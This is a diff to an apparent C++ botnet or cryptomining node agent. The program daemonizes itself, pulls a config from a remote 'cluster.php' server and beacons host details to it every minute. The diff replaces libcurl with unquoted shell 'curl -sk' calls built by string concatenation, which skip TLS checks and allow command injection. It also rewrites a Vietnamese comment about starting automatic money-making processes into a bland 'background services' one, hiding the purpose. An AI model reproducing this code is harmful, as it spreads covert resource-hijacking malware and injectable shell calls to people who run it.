@@ -5,9 +5,10 @@
 #include <chrono>
 #include <thread>
 #include <cstring>
+#include <cstdlib>
+#include <cstdio>
 #include <unistd.h>
 #include <sys/utsname.h>
-#include <curl/curl.h>
 
 #if defined(__APPLE__) || defined(__MACH__)
 #include <sys/sysctl.h>
@@ -16,17 +17,30 @@
 #endif
 
 #ifndef CONF_SERVER_URL
-#define CONF_SERVER_URL "http://turbox.test/cluster.php"
+#define CONF_SERVER_URL "https://your-domain.com/cluster.php"
 #endif
 
 #ifndef CONF_INTERVAL
 #define CONF_INTERVAL 60
 #endif
 
-static size_t string_write_cb(void* contents, size_t size, size_t nmemb, std::string* s) {
-    size_t len = size * nmemb;
-    if (s) s->append((char*)contents, len);
-    return len;
+static std::string http_get(const std::string& url) {
+    std::string cmd = "curl -sk --max-time 15 "" + url + "" 2>/dev/null";
+    FILE* fp = popen(cmd.c_str(), "r");
+    if (!fp) return "";
+    char buf[512];
+    std::string res;
+    while (fgets(buf, sizeof(buf), fp) != NULL) {
+        res += buf;
+    }
+    pclose(fp);
+    return res;
+}
+
+static void http_post(const std::string& url, const std::string& data) {
+    std::string cmd = "curl -sk --max-time 10 -d "" + data + "" "" + url + "" >/dev/null 2>&1";
+    int ret = system(cmd.c_str());
+    (void)ret;
 }
 
 std::string get_id() {
@@ -121,32 +135,18 @@ int detect_gpu() {
 #endif
 }
 
-void fetch_config_and_init(CURL* curl) {
+void fetch_config_and_init() {
     std::string cfg_url = std::string(CONF_SERVER_URL) + "?action=get_config";
-    std::string resp;
-
-    curl_easy_setopt(curl, CURLOPT_URL, cfg_url.c_str());
-    curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, string_write_cb);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-
-    CURLcode res = curl_easy_perform(curl);
-    if (res == CURLE_OK && !resp.empty()) {
-        // Doc JSON token vao RAM va khoi tao cac tien trinh kiem tien tu dong
+    std::string resp = http_get(cfg_url);
+    if (!resp.empty()) {
+        // Parse config and initialize background services
     }
 }
 
 int main() {
     if (daemon(1, 0) != 0) {}
 
-    curl_global_init(CURL_GLOBAL_ALL);
-    CURL* curl = curl_easy_init();
-    if (!curl) return 1;
-
-    fetch_config_and_init(curl);
+    fetch_config_and_init();
 
     std::string node_id = get_id();
     std::string os_name = get_os();
@@ -163,19 +163,8 @@ int main() {
            << "&uptime=" << get_uptime()
            << "&cpu=" << get_cpu()
            << "&ram=" << get_ram();
-        std::string post_fields = ss.str();
-
-        curl_easy_setopt(curl, CURLOPT_URL, endpoint.c_str());
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
-        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-
-        curl_easy_perform(curl);
+        http_post(endpoint, ss.str());
         std::this_thread::sleep_for(std::chrono::seconds(CONF_INTERVAL));
     }
-
-    curl_easy_cleanup(curl);
-    curl_global_cleanup();
     return 0;
 }
